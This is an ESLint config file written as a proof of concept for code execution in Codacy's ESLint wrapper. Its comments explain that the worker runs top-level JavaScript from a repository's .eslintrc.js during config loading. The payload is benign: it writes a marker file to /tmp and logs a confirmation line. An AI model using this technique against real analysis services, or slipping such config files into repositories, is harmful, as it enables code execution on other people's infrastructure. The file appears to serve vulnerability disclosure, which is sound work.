// PoC payload — benign marker only. RCE via codacy-eslint: the wrapper sets
// useEslintrc:true (no Codacy patterns) and cwd:/src, so ESLint loads this file
// via loadJSConfigFile -> import-fresh -> Module._compile (Node require()).
// Top-level code below runs during config load inside the Codacy worker, before linting.
var fs = require("fs");
var marker = "/tmp/codacy-eslint-rce-confirmed.txt";
var body = "RCE confirmed via .eslintrc.js load. cwd=" + __dirname + " marker=" + marker + "\n";
try {
  fs.writeFileSync(marker, body);
  console.log("CODEX-RCE-MARKER-ESLINT " + __dirname + " " + marker);
} catch (e) {
  console.log("CODEX-RCE-MARKER-ESLINT-ERR " + e.message);
}
module.exports = { root: true, parserOptions: { sourceType: "module", ecmaVersion: 2020 }, rules: {} };
